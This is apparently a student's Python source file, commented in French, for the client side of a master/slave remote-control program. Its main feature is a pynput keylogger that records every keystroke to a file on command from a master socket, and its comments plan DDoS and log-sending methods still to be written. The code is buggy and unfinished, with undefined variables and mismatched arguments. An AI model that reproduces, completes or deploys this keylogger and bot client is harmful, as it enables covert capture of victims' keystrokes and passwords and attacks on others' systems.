#importation du module socket afin de permetttre une communication réseau
import socket as modSocket
from pynput.keyboard import Key, Listener
import logging
import threading

lock = threading.Lock()

"""
création de l'objet communication
avec le champ data, qui va contenir le message envoyé par le maitre.
il y a plusieurs champs qui vont être des actions a effectuer.
start_log() va lancer un logger qui va enregistrer tous ce qui vas être taper
sur le clavier.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Une fois que le code rentre dans le start_log(), il ne s'y retire plus, on rentre dans une
sorte de boucle infini, on est obligé de stopper de force le programme pour y sortir. Et ont veut que
le programme ne s'éteigne jamais, et puisse recommencer à communiquer avec le maitre.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
ddos() ..................
send_log() ..............
fais ce qui te plais avec les 2 methodes au dessus a toi de t'amuser :D
"""

class Communication():
    
    def __init__(self, machineMaitre, slaveListen, slaveListen2):
        self.machineMaitre = machineMaitre
        self.slaveListen = slaveListen
        self.slaveListen2 = slaveListen2
        
    def ecoute(self, slaveListen):
        slaveListen2.bind(("localhost", 60000))
        slaveListen2.listen()
        print("Je suis maintenant en écoute")
        distantSocket, addr = slaveListen2.accept()
        return distantSocket.recv(1024)

    def connexion(self, machineMaitre, slaveListen):
        # on définit les coordonnées sur lesquelles le slave va envoyer son adresse ip
        slaveListen.connect(machineMaitre)
        slaveListen.send("192.168.1.1".encode("utf-8"))
        print("IP envoyée au master")

class Action():

    def __init__(self, data):
        self.data = data

    def start_log(self, data, distant_socket):
        #chemin ou seront écris les logs voulus
        log_dir = r"C:\\Users\\Salihu Brilant\\Desktop"
        #met les informations de base concernant le logger
        #filename, spécifie le nom du fichier
        #format, impose les infos de base qui se trouveront dans le logger, içi la date avec l'heure puis les infos sur les entrées sur le clavier 
        logging.basicConfig(filename = (log_dir + "\\keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
        #Création d'une fonction appuie(), qui vas mettre en string touts les appuie sur le clavier
        def appuie(key):
            logging.info(str(key))  
        #une fois rentrer içi le programme écoute les appuie sur les entrées
        with Listener(on_press=appuie) as listener:
            distant_socket.send(b"Logger actif")
            #cette condition nous permet d'arreter le logger
            if distant_socket.recv(1024).decode("utf-8") != "stop":
                listener.join()
            distant_socket.send(b"Logger inactif")
            print("Logger arretée")
            # !!!!!!! Je ne sais pas comment recommencer le programme une fois le logger arreté !!!!!!!!
        data = distant_socket.recv(1024).decode("utf-8")


machineMaitre = (("localhost", 60000))
slaveListen = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
slaveListen2 = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
a = Communication(machineMaitre, slaveListen, slaveListen2)

lock.acquire()
a.connexion(machineMaitre, slaveListen)
lock.release()

a.ecoute(slaveListen2)

"""
#boucle qui permet de lancer une methode de l'objet communication
while data != "FIN":
    if data == "keylogger":
        print("OK je lance le keylogger")
        #lance la methode start_log de l'objet Communication
        a.start_log(data, conn)
        data = distant_socket.recv(1024).decode("utf-8")
    data = distant_socket.recv(1024).decode("utf-8")
# rajoute ddos() ou send_log(), choisi :D
"""

"""
Dernier problème que je ne comprend pas dans notre programme.
Il reçoit les réponse du maitre dans l'ordre (data = conn.recv(1024).decode("utf-8"))
par exemple si dans le maitre après avoir prit le choix pour lancer le keylogger, on ne choisi pas après
celui pour l'arreter on ne pourra plus arreter le programme par après.
car il y a un ordre qui ces créer dans les data.
:(
"""
    

slaveListen.close()